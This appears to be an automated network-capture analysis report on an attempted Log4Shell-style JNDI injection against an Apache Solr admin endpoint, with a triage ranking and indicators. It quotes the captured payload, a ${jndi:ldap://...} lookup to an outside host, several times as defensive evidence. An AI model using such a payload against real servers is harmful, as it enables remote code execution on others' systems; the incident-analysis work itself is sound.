@@ -1,0 +1,39 @@
+=== PCAP Analysis Report ===
+File: incident.pcap
+Processing Status: Valid
+Total TCP Streams: 1
+TCP Stream IDs: 0
+Protocol Counts: ICMPv6=2, ARP=2, TCP=8, HTTP=1, DNS=8, HTTP/JSON=1
+
+Connections Overview:
+================================================================================
+TCP Conversations
+Filter:<No Filter>
+                                                           |       <-      | |       ->      | |     Total     |    Relative    |   Duration   |
+                                                           | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |      Start     |              |
+172.18.0.1:51346           <-> 172.18.0.2:8983                  4 1025 bytes       6 720 bytes      10 1745 bytes   120.751736000         0.6533
+================================================================================
+
+
+=== HEURISTIC ATTACK-FLOW PRIORITY (packet-derived, NOT ground truth) ===
+These are investigation leads. Ordinary traffic may coexist with attacks; HTTP response errors alone neither prove nor disprove exploitation.
+Rank 1: TCP stream 0; score=10/12; frame=8; HTTP request candidate GET /solr/admin/cores?action=${jndi:ldap://8qvsbr.sdasda1212.cn} to 172.18.0.2:8983; request frame=8; indicator frame=8; indicators=JNDI lookup expression; bounded indicator excerpt=${jndi:ldap:; response HTTP 400 frame=12 (status alone does not prove exploit outcome); heuristic triage ONLY, not proof of exploit or CVE
+
+=== Flow Analysis ===
+
+--- Stream 0 [VALID] ---
+Service: Apache Solr Admin API (version not visible)
+Relevant Events:
+- [E-S0000-F000008-004] GET request to /solr/admin/cores with action parameter containing a JNDI LDAP lookup expression (${jndi:ldap://...})
+- [E-S0000-F000008-011] Indicator flagged: JNDI lookup expression in the HTTP request (potential Log4Shell-style payload)
+- [E-S0000-F000012-009] Server responded with HTTP 400 Bad Request
+
+Exploit Indicators:
+- [E-S0000-F000008-004] action=${jndi:ldap://8qvsbr.sdasda1212.cn}
+- [E-S0000-F000008-011] JNDI lookup expression indicator
+
+Malicious Activities: Attempted JNDI/Log4j injection against Apache Solr admin endpoint. No authentication/login occurred (the “admin” keyword is part of the URL path [E-S0000-F000008-007]; “root” appears only as a keyword in the response metadata [E-S0000-F000012-010]). No commands executed observed.
+
+Attack Success: Unknown
+
+Evidence Keywords: Apache Solr, /solr/admin/cores, JNDI, ${jndi:ldap://}, LDAP, Log4j, Log4Shell, E-S0000-F000008-004, E-S0000-F000008-011, E-S0000-F000012-009, E-S0000-F000008-007, E-S0000-F000012-010
